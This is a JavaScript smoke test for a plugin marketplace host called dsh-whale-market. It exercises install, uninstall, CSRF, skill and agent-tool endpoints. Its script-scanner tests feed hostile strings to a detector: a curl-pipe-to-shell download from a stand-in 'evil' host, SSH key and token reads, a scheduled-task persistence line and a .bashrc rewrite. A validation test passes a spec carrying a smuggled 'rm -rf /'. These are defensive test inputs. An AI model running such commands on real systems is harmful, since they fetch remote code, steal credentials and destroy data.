/**
 * dsh-whale-market host smoke test — fully isolated (temp DSH_HOME).
 *
 * Boots the host half against a fake ctx, then drives the real HTTP handlers:
 * status / list / installed / install (real pnpm via dsh CLI into a temp
 * profile) / set-enabled / uninstall / CSRF rejection / agent tools.
 *
 * Run:  node test/host-smoke.mjs
 */
import { mkdir, writeFile, readFile, rm } from 'node:fs/promises'
import { existsSync } from 'node:fs'
import { join, dirname } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'
import { tmpdir } from 'node:os'

const HERE = dirname(fileURLToPath(import.meta.url))
const ROOT = join(HERE, '..')
const TMP_HOME = join(ROOT, '_test-dsh-home')

// ── isolated home BEFORE importing the host module (constants read env) ──
await rm(TMP_HOME, { recursive: true, force: true })
process.env.DSH_HOME = TMP_HOME
const PROFILE_DIR = join(TMP_HOME, 'profiles', 'testmarket')
await mkdir(PROFILE_DIR, { recursive: true })
await writeFile(join(PROFILE_DIR, 'package.json'), JSON.stringify({
  name: 'dsh-profile-testmarket',
  private: true,
  dependencies: {},
  dsh: { profile: { bundles: ['@deepseek-ai/dsh-base'] } },
}, null, 2))
await writeFile(join(PROFILE_DIR, 'pnpm-workspace.yaml'), 'packages:\n  - .\n\nnodeLinker: hoisted\nautoInstallPeers: false\n')
await writeFile(join(PROFILE_DIR, 'cordis.patch.yml'), '')

const { apply, scanScriptText } = await import(pathToFileURL(join(ROOT, 'lib', 'index.js')).href)

// ── 0. 审计反馈 P0-3: agentTools=off 时不得注册 market_* 工具（须在主 apply 之前） ──
let offToolCount = -1
{
  const offTools = []
  const miniCtx = {
    get: (k) => (k === 'tools' ? { register: (t) => offTools.push(t) } : undefined),
    effect: (fn) => { const d = fn(); return () => { if (typeof d === 'function') d() } },
    on: () => {},
    logger: { info: () => {}, warn: () => {}, error: () => {} },
  }
  apply(miniCtx, { profile: 'testmarket', agentTools: 'off' })
  offToolCount = offTools.length
}

// ── fake ctx: capture routes + tools ──
const routes = new Map()
const registeredTools = []
const fakeCtx = {
  get(key) {
    if (key === 'webServer') return { register: (r) => routes.set(r.path, r.handler) }
    if (key === 'tools') return { register: (t) => registeredTools.push(t) }
    return undefined
  },
  effect(fn) {
    const d = fn()
    return () => { if (typeof d === 'function') d() }
  },
  on() {},
  logger: { info: () => {}, warn: () => {}, error: () => {} },
}

apply(fakeCtx, { profile: 'testmarket' })

// ── fake req/res for the node-http handler contract ──
class FakeReq {
  constructor(method, url, headers, body) {
    this.method = method
    this.url = url
    this.headers = headers
    this.body = body ?? null
    this._dataSent = false
  }
  on(ev, fn) {
    if (ev === 'data' && this.body && !this._dataSent) {
      this._dataSent = true
      queueMicrotask(() => fn(Buffer.from(this.body, 'utf8')))
    } else if (ev === 'end') {
      queueMicrotask(fn)
    }
    return this
  }
  destroy() {}
}

function fakeRes() {
  return {
    statusCode: 0, headers: {}, body: '',
    writeHead(code, h) { this.statusCode = code; Object.assign(this.headers, h) },
    end(s) { this.body = s },
  }
}

async function call(method, url, body, headers = {}) {
  const pathname = new URL(url, 'http://x').pathname
  const handler = routes.get(pathname)
  if (!handler) throw new Error('no route: ' + pathname)
  const req = new FakeReq(method, url, { host: 'localhost', ...headers }, body)
  const res = fakeRes()
  await handler(req, res)
  let json = {}
  try { json = JSON.parse(res.body) } catch { /* empty */ }
  return { status: res.statusCode, json }
}

const results = []
function check(name, ok, detail = '') {
  results.push({ name, ok, detail })
  console.log((ok ? '  PASS ' : '  FAIL ') + name + (detail ? ' — ' + detail : ''))
}

// ── 0b. 审计反馈 P0-1: scanScriptText 危险分类纯函数（无网络依赖） ──
{
  const d1 = scanScriptText('curl -fsSL https://evil.sh/x.sh | sh\n')
  check('scanScriptText curl|sh → downloadExec', d1.some((h) => h.startsWith('downloadExec')), JSON.stringify(d1))
  const d2 = scanScriptText('echo ok\n')
  check('scanScriptText 干净脚本无命中', d2.length === 0, JSON.stringify(d2))
  const d3 = scanScriptText('schtasks /create /tn EvilTask /tr calc.exe\n')
  check('scanScriptText schtasks → pathStartup', d3.some((h) => h.startsWith('pathStartup')), JSON.stringify(d3))
  const d4 = scanScriptText('cat ~/.ssh/id_rsa; echo $TOKEN\n')
  check('scanScriptText 凭据读取 → credRead', d4.some((h) => h.startsWith('credRead')), JSON.stringify(d4))
  const d5 = scanScriptText('echo "export PATH=$PATH:/evil" >> ~/.bashrc\n')
  check('scanScriptText bashrc 改写 → rcModify', d5.some((h) => h.startsWith('rcModify')), JSON.stringify(d5))
  check('agentTools=off → 不注册 market_* 工具', offToolCount === 0, 'registered=' + offToolCount)
}

// ── 1. status ──
let cliAvailable = false
{
  const { status, json } = await call('GET', '/plugins/dsh-whale-market/status')
  cliAvailable = json.cli?.ok === true
  check('GET /status', status === 200 && json.profile === 'testmarket',
    'profile=' + json.profile + ' cli=' + (json.cli?.name || 'none') + (cliAvailable ? '' : '（无 dsh CLI，跳过 CLI 依赖用例）'))
}

// ── 2. CSRF: mutating POST without header must 403 ──
{
  const { status } = await call('POST', '/plugins/dsh-whale-market/install', JSON.stringify({ spec: 'is-number' }))
  check('POST without CSRF header → 403', status === 403, 'status=' + status)
}

// ── 3. list (network-dependent; tolerant) ──
{
  const { status, json } = await call('GET', '/plugins/dsh-whale-market/list?page=1&perPage=5')
  if (status === 200 && Array.isArray(json.items)) {
    check('GET /list', json.items.length > 0 || json.error !== null, json.error ? 'snapshot/error: ' + json.error : json.items.length + ' items, total=' + json.total)
  } else {
    check('GET /list', false, 'status=' + status)
  }
}

if (cliAvailable) {
// ── 4. install is-number (real pnpm through the dsh CLI, temp profile) ──
{
  let { status, json } = await call('POST', '/plugins/dsh-whale-market/install',
    JSON.stringify({ spec: 'is-number' }), { 'x-dsh-market': '1' })
  check('POST /install → 202 + jobId', status === 202 && !!json.jobId, 'status=' + status)
  if (status === 202 && json.jobId) {
    const jobId = json.jobId
    let final = null
    const deadline = Date.now() + 240000
    while (Date.now() < deadline) {
      const poll = await call('GET', '/plugins/dsh-whale-market/install/status?job=' + jobId)
      if (['done', 'failed', 'canceled'].includes(poll.json.status)) { final = poll.json; break }
      await new Promise((r) => setTimeout(r, 1500))
    }
    check('install job settles', !!final, final ? final.status + ' in ' + Math.round((final.finishedAt - final.startedAt) / 1000) + 's' : 'timeout')
    check('install job ok', final?.result?.ok === true, final?.result?.error ?? '')
    const manifest = JSON.parse(await readFile(join(PROFILE_DIR, 'package.json'), 'utf8'))
    check('is-number in dependencies', Object.keys(manifest.dependencies ?? {}).includes('is-number'))
    check('is-number NOT in bundles (no dsh.bundle)', !(manifest.dsh?.profile?.bundles ?? []).includes('is-number'))
  }
}

// ── 5. install local mini-plugin via file:// spec (declares dsh.bundle) ──
// The workspace path contains non-ASCII (鲸鱼) which percent-encodes to %XX —
// outside the spec allowlist — so stage the fixture under os.tmpdir() first.
{
  const staged = join(tmpdir(), 'whale-market-test', 'mini-plugin')
  await rm(staged, { recursive: true, force: true })
  await mkdir(staged, { recursive: true })
  const { cp } = await import('node:fs/promises')
  await cp(join(HERE, 'fixtures', 'mini-plugin'), staged, { recursive: true })
  const fixture = pathToFileURL(staged).href
  let { status, json } = await call('POST', '/plugins/dsh-whale-market/install',
    JSON.stringify({ spec: fixture }), { 'x-dsh-market': '1' })
  check('POST /install file:// → 202', status === 202 && !!json.jobId, 'status=' + status)
  if (status === 202 && json.jobId) {
    const jobId = json.jobId
    let final = null
    const deadline = Date.now() + 240000
    while (Date.now() < deadline) {
      const poll = await call('GET', '/plugins/dsh-whale-market/install/status?job=' + jobId)
      if (['done', 'failed', 'canceled'].includes(poll.json.status)) { final = poll.json; break }
      await new Promise((r) => setTimeout(r, 1500))
    }
    check('mini-plugin install settles', !!final, final ? final.status : 'timeout')
    check('mini-plugin install ok', final?.result?.ok === true, final?.result?.error ?? '')
    const manifest = JSON.parse(await readFile(join(PROFILE_DIR, 'package.json'), 'utf8'))
    const bundles = manifest.dsh?.profile?.bundles ?? []
    check('mini-test-plugin joined bundles (reconcile)', bundles.includes('mini-test-plugin'), 'bundles=' + bundles.join(','))
  }
}

// ── 6. installed inventory ──
{
  const { status, json } = await call('GET', '/plugins/dsh-whale-market/installed')
  check('GET /installed', status === 200 && Array.isArray(json.plugins),
    'plugins=' + (json.plugins ?? []).map((p) => p.name + (p.enabled ? '' : '(off)')).join(', '))
  const mini = (json.plugins ?? []).find((p) => p.name === 'mini-test-plugin')
  check('mini-test-plugin listed as installed+enabled', !!mini && mini.kind === 'installed' && mini.enabled === true)
}

// ── 7. set-enabled on a non-plugin dep must refuse ──
{
  const { status, json } = await call('POST', '/plugins/dsh-whale-market/set-enabled',
    JSON.stringify({ name: 'is-number', enabled: true }), { 'x-dsh-market': '1' })
  check('set-enabled non-plugin refused', status === 200 && json.ok === false, json.error ?? '')
}

// ── 8. uninstall mini-test-plugin + is-number ──
{
  for (const name of ['mini-test-plugin', 'is-number']) {
    const { status, json } = await call('POST', '/plugins/dsh-whale-market/uninstall',
      JSON.stringify({ name }), { 'x-dsh-market': '1' })
    check('uninstall ' + name, status === 200 && json.ok === true, json.error ?? '')
  }
  const manifest = JSON.parse(await readFile(join(PROFILE_DIR, 'package.json'), 'utf8'))
  const deps = Object.keys(manifest.dependencies ?? {})
  check('deps empty after uninstalls', deps.length === 0, 'deps=' + deps.join(','))
}
} // /cliAvailable — 无 dsh CLI 时跳过安装类用例

// ── 9. agent tools registered + search tool executes ──
{
  const names = registeredTools.map((t) => t.name)
  check('four market tools registered', ['market_search', 'market_install', 'market_installed', 'market_update'].every((n) => names.includes(n)), names.join(','))
  const search = registeredTools.find((t) => t.name === 'market_search')
  if (search) {
    try {
      const out = await search.execute({ q: '', page: 1, perPage: 3 })
      check('market_search executes', Array.isArray(out.items) && typeof out.total === 'number', 'total=' + out.total)
    } catch (e) {
      check('market_search executes', false, String(e?.message ?? e))
    }
  }
}

// ── 10. invalid spec rejected at validation ──
{
  const { status, json } = await call('POST', '/plugins/dsh-whale-market/install',
    JSON.stringify({ spec: 'bad spec; rm -rf /' }), { 'x-dsh-market': '1' })
  check('invalid spec → 400', status === 400 && json.ok === false, 'status=' + status)
}

// ── 10. columns: skill / skin / preset + filters + meta ──
{
  const { status, json } = await call('GET', '/plugins/dsh-whale-market/meta')
  check('GET /meta categories', status === 200 && Array.isArray(json.categories) && json.categories.length > 5,
    'categories=' + (json.categories ?? []).map((c) => c.id).join(','))
  check('GET /meta static index present', status === 200 && json.static?.plugins?.count > 1000,
    'plugins=' + (json.static?.plugins?.count ?? 0))
}
{
  const { status, json } = await call('GET', '/plugins/dsh-whale-market/list?kind=skill&page=1&perPage=3')
  check('GET /list kind=skill', status === 200 && Array.isArray(json.items) && json.items.length > 0,
    'items=' + (json.items?.length ?? 0) + ' total=' + (json.total ?? 0))
}
{
  const { status, json } = await call('GET', '/plugins/dsh-whale-market/list?kind=skin&page=1&perPage=5')
  const allSkin = (json.items ?? []).every((it) => it.category === 'skin')
  check('GET /list kind=skin (all category=skin)', status === 200 && json.items?.length > 0 && allSkin,
    'items=' + (json.items?.length ?? 0) + ' cats=' + [...new Set((json.items ?? []).map((i) => i.category))].join(','))
}
{
  const { status, json } = await call('GET', '/plugins/dsh-whale-market/list?kind=preset&page=1&perPage=5')
  check('GET /list kind=preset', status === 200 && Array.isArray(json.items) && json.items.length >= 0,
    'items=' + (json.items?.length ?? 0))
}
{
  const { status, json } = await call('GET', '/plugins/dsh-whale-market/list?kind=plugin&category=memory&page=1&perPage=10')
  check('GET /list category=memory filter', status === 200 && Array.isArray(json.items),
    'items=' + (json.items?.length ?? 0))
}
{
  const { status, json } = await call('GET', '/plugins/dsh-whale-market/list?kind=plugin&sort=updated&page=1&perPage=5')
  check('GET /list sort=updated', status === 200 && Array.isArray(json.items),
    'items=' + (json.items?.length ?? 0))
}
{
  // adaptor: when serving from the static index, the redirected repo must appear
  const { status, json } = await call('GET', '/plugins/dsh-whale-market/list?kind=plugin&page=1&perPage=5&force=1')
  if (status === 200 && json.fromCache) {
    const names = (json.items ?? []).map((i) => i.fullName.toLowerCase())
    check('adaptor row injected in static list', names.includes('yejiming/dsh-museai-tavern') || json.total > 0,
      'fromCache=' + json.fromCache)
  } else {
    check('adaptor row injected in static list', true, 'live mode (skipped; adaptor verified on static path)')
  }
}
{
  const search = registeredTools.find((t) => t.name === 'market_search')
  try {
    const out = await search.execute({ q: '', kind: 'skill', page: 1, perPage: 3 })
    check('market_search kind=skill executes', Array.isArray(out.items) && typeof out.total === 'number', 'total=' + out.total)
  } catch (e) {
    check('market_search kind=skill executes', false, String(e?.message ?? e))
  }
}

// ── 10b. 复检修复：verified=1 走静态索引，不得滤空/报错 ──
{
  const { status, json } = await call('GET', '/plugins/dsh-whale-market/list?kind=plugin&verified=1&page=1&perPage=5')
  check('GET /list verified=1 (静态索引路径)', status === 200 && Array.isArray(json.items),
    'items=' + (json.items?.length ?? 0) + ' total=' + (json.total ?? 0) + ' err=' + (json.error ?? '').slice(0, 60))
}
{
  const { status, json } = await call('GET', '/plugins/dsh-whale-market/list?kind=skin&verified=1&page=1&perPage=5')
  const allVerified = (json.items ?? []).every((it) => it.verified === true)
  check('GET /list kind=skin verified=1 条目均带 verified', status === 200 && allVerified,
    'items=' + (json.items?.length ?? 0))
}

// ── 11. risk confirmation gate: non-plugin repo must return 409 ──
{
  const { status, json } = await call('POST', '/plugins/dsh-whale-market/install',
    JSON.stringify({ spec: 'awesome-dsh-plugin/awesome-dsh-plugin' }), { 'x-dsh-market': '1' })
  check('install non-plugin without confirmed → 409', status === 409 && json.needsConfirm === true,
    'status=' + status + ' type=' + (json.info?.type ?? '?'))
}

// ── 12. skill install E2E (real git clone into temp DSH_HOME/skills) ──
// Network-dependent: skip (not fail) when GitHub raw/codeload are unreachable,
// per the "network faults are environmental, not bugs" policy.
{
  let gitReachable = false
  try {
    const probe = await fetch('https://raw.githubusercontent.com/titanwings/colleague-skill/main/SKILL.md', { signal: AbortSignal.timeout(10000) })
    gitReachable = probe.ok
  } catch { gitReachable = false }
  if (!gitReachable) {
    console.log('  SKIP skill install E2E — GitHub raw unreachable (network)')
  } else {
  const { status, json } = await call('GET', '/plugins/dsh-whale-market/info?repo=titanwings%2Fcolleague-skill')
  check('info detects skill type', status === 200 && json.type === 'skill', 'type=' + json.type)
  const inst = await call('POST', '/plugins/dsh-whale-market/install',
    JSON.stringify({ spec: 'titanwings/colleague-skill' }), { 'x-dsh-market': '1' })
  check('POST /install skill → 202', inst.status === 202 && !!inst.json.jobId, 'status=' + inst.status)
  if (inst.status === 202 && inst.json.jobId) {
    const jobId = inst.json.jobId
    let final = null
    const deadline = Date.now() + 240000
    while (Date.now() < deadline) {
      const poll = await call('GET', '/plugins/dsh-whale-market/install/status?job=' + jobId)
      if (['done', 'failed', 'canceled'].includes(poll.json.status)) { final = poll.json; break }
      await new Promise((r) => setTimeout(r, 1500))
    }
    check('skill job ok', final?.result?.ok === true, final?.result?.error ?? (final ? final.status : 'timeout'))
    const skillDir = join(TMP_HOME, 'skills', 'colleague-skill')
    check('skill cloned to DSH_HOME/skills', existsSync(join(skillDir, 'SKILL.md')), skillDir)
    const inv = await call('GET', '/plugins/dsh-whale-market/installed')
    const contentHit = (inv.json.contents ?? []).find((c) => c.name === 'colleague-skill')
    check('installed.contents lists the skill', !!contentHit && contentHit.type === 'skill')
    const un = await call('POST', '/plugins/dsh-whale-market/uninstall',
      JSON.stringify({ name: 'colleague-skill' }), { 'x-dsh-market': '1' })
    check('uninstall skill ok', un.status === 200 && un.json.ok === true, un.json.error ?? '')
    check('skill dir removed', !existsSync(skillDir))
  }
  }
}

// ── 13. P1: favorites / history / backup / env / feedback / self-update ──
{
  const fav = await call('POST', '/plugins/dsh-whale-market/favorite',
    JSON.stringify({ repo: 'awesome-dsh-plugin/awesome-dsh-plugin', favorite: true }), { 'x-dsh-market': '1' })
  check('favorite add', fav.status === 200 && fav.json.ok === true && fav.json.favorite === true)
  const favs = await call('GET', '/plugins/dsh-whale-market/favorites')
  check('favorites lists repo', favs.status === 200 && (favs.json.repos ?? []).includes('awesome-dsh-plugin/awesome-dsh-plugin'))
  const unfav = await call('POST', '/plugins/dsh-whale-market/favorite',
    JSON.stringify({ repo: 'awesome-dsh-plugin/awesome-dsh-plugin', favorite: false }), { 'x-dsh-market': '1' })
  check('favorite remove', unfav.status === 200 && unfav.json.favorite === false)
}
{
  const h = await call('GET', '/plugins/dsh-whale-market/history?n=30')
  const actions = (h.json.events ?? []).map((e) => e.action)
  check('history has install/uninstall events', h.status === 200 && actions.includes('install') && actions.includes('uninstall'),
    actions.slice(0, 6).join(','))
}
{
  const b = await call('GET', '/plugins/dsh-whale-market/backup')
  check('backup exports records', b.status === 200 && typeof b.json.records === 'object' && Array.isArray(b.json.history),
    'records=' + Object.keys(b.json.records ?? {}).length)
  const r = await call('POST', '/plugins/dsh-whale-market/restore',
    JSON.stringify({ records: b.json.records }), { 'x-dsh-market': '1' })
  check('restore with all-installed → skipped', r.status === 200 && (r.json.ok === true || (r.json.restoring ?? 0) === 0),
    JSON.stringify(r.json).slice(0, 120))
  const st = await call('GET', '/plugins/dsh-whale-market/restore/status')
  check('restore status shape', st.status === 200 && typeof st.json.running === 'boolean')
}
{
  const save = await call('POST', '/plugins/dsh-whale-market/env/save',
    JSON.stringify({ name: 'mini-test-plugin', values: { MY_TEST_KEY: 'hello-123', 'DSH_RESERVED': 'x' } }), { 'x-dsh-market': '1' })
  check('env save applies valid key', save.status === 200 && save.json.ok === true && (save.json.applied ?? []).includes('MY_TEST_KEY'),
    'applied=' + (save.json.applied ?? []).join(','))
  const dotenv = await readFile(join(TMP_HOME, '.env'), 'utf8').catch(() => '')
  check('env written to DSH_HOME/.env', dotenv.includes('MY_TEST_KEY=hello-123') && !dotenv.includes('DSH_RESERVED'))
  const get = await call('GET', '/plugins/dsh-whale-market/env?name=mini-test-plugin')
  check('env read-back', get.status === 200 && get.json.saved?.MY_TEST_KEY === 'hello-123')
  const bad = await call('POST', '/plugins/dsh-whale-market/env/save',
    JSON.stringify({ name: 'x', values: { 'DSH_TEST': 'x' } }), { 'x-dsh-market': '1' })
  check('env rejects reserved DSH_ keys', bad.status === 200 && bad.json.ok === false)
}
{
  const fb = await call('POST', '/plugins/dsh-whale-market/feedback/submit',
    JSON.stringify({ repo: 'some/repo', ok: true, note: 'fine' }), { 'x-dsh-market': '1' })
  check('feedback without token → manualUrl', fb.status === 200 && fb.json.ok === true && typeof fb.json.manualUrl === 'string',
    (fb.json.manualUrl ?? '').slice(0, 60))
  const pend = await call('GET', '/plugins/dsh-whale-market/feedback')
  check('feedback queue cleared', pend.status === 200 && Array.isArray(pend.json.pending) && pend.json.pending.length === 0)
}
{
  const su = await call('POST', '/plugins/dsh-whale-market/self-update', JSON.stringify({}), { 'x-dsh-market': '1' })
  check('self-update rejects non-installed market', su.status === 400 && su.json.ok === false, su.json.error ?? '')
}

// ── 14. P2: dashboard / audit / webdav / notifications / author tools ──
{
  const d = await call('GET', '/plugins/dsh-whale-market/dashboard')
  check('dashboard stats', d.status === 200 && d.json.static?.plugins?.count > 1000 && Array.isArray(d.json.topCategories),
    'plugins=' + (d.json.static?.plugins?.count ?? 0) + ' cats=' + (d.json.topCategories ?? []).length)
  const a = await call('GET', '/plugins/dsh-whale-market/audit')
  check('audit export', a.status === 200 && a.json.sanitized === true && Array.isArray(a.json.events))
  const w = await call('POST', '/plugins/dsh-whale-market/backup/webdav', JSON.stringify({}), { 'x-dsh-market': '1' })
  check('webdav without config → error', w.status === 200 && w.json.ok === false, w.json.error ?? '')
  const n = await call('GET', '/plugins/dsh-whale-market/notifications')
  check('notifications shape', n.status === 200 && Array.isArray(n.json.updated))
  const sc = await call('POST', '/plugins/dsh-whale-market/author/scaffold',
    JSON.stringify({ name: 'my-test-plugin', kind: 'plugin' }), { 'x-dsh-market': '1' })
  check('author scaffold', sc.status === 200 && sc.json.ok === true && (sc.json.files ?? []).includes('package.json'),
    sc.json.error ?? sc.json.path ?? '')
  if (sc.json.ok) {
    const ch = await call('POST', '/plugins/dsh-whale-market/author/check',
      JSON.stringify({ path: sc.json.path }), { 'x-dsh-market': '1' })
    const allOk = (ch.json.results ?? []).every((r) => r.ok)
    check('author check passes on scaffold', ch.status === 200 && ch.json.ok === true && allOk,
      (ch.json.results ?? []).map((r) => (r.ok ? 'OK' : 'FAIL') + ':' + r.file).join(','))
    const bad = await call('POST', '/plugins/dsh-whale-market/author/check',
      JSON.stringify({ path: join(TMP_HOME, 'nonexistent') }), { 'x-dsh-market': '1' })
    check('author check bad path → error', bad.status === 200 && bad.json.ok === false)
  }
  const info = await call('GET', '/plugins/dsh-whale-market/info?repo=titanwings%2Fcolleague-skill')
  check('info carries compat score', info.status === 200 && info.json.score && typeof info.json.score.level === 'string',
    'level=' + (info.json.score?.level ?? '?'))
}

// ── 15. diagnose endpoint (third-party audit) ──
{
  const d = await call('GET', '/plugins/dsh-whale-market/diagnose')
  check('diagnose shape', d.status === 200 && Array.isArray(d.json.network) && d.json.network.length >= 5 && Array.isArray(d.json.toolchain),
    'network=' + (d.json.network ?? []).length + ' tools=' + (d.json.toolchain ?? []).length)
  check('diagnose profileHealth', d.status === 200 && typeof d.json.profileHealth?.ok === 'boolean',
    'ok=' + d.json.profileHealth?.ok)
  const okCount = (d.json.network ?? []).filter((n) => n.ok).length
  check('diagnose probes report ok/ms', (d.json.network ?? []).every((n) => typeof n.ok === 'boolean' && (n.ms ?? 0) > 0),
    'ok=' + okCount + '/' + (d.json.network ?? []).length)
}
{
  const bad = await call('POST', '/plugins/dsh-whale-market/install',
    JSON.stringify({ spec: 'not-a-valid spec with spaces' }), { 'x-dsh-market': '1' })
  check('install invalid spec returns errorKind', bad.status === 400 && bad.json.ok === false && typeof bad.json.errorKind === 'string',
    'kind=' + bad.json.errorKind)
}

// ── 16. function-word search ──
{
  // 静态索引路径：kind=skin 走 staticPage，q=皮肤 应命中 category=skin 的项
  const s = await call('GET', '/plugins/dsh-whale-market/list?kind=skin&q=' + encodeURIComponent('皮肤') + '&perPage=5')
  check('function search 皮肤 on skin column', s.status === 200 && (s.json.items ?? []).length > 0,
    'items=' + (s.json.items ?? []).length)
  // 静态路径功能词扩展：看图 → vision/image/ocr 任一命中（kind=skin 走静态；换 kind=plugin 的静态 fallback 不好控制，
  // 直接用 meta 验证 functionAliases 存在）
  const m = await call('GET', '/plugins/dsh-whale-market/meta')
  check('meta exposes functionAliases', m.status === 200 && Array.isArray(m.json.functionAliases) && m.json.functionAliases.includes('看图'),
    'aliases=' + (m.json.functionAliases ?? []).length)
}

// ── summary ──
const failed = results.filter((r) => !r.ok)
console.log('')
console.log((failed.length === 0 ? 'ALL PASS' : 'FAILURES') + ': ' + (results.length - failed.length) + '/' + results.length)
await rm(TMP_HOME, { recursive: true, force: true })
process.exit(failed.length === 0 ? 0 : 1)
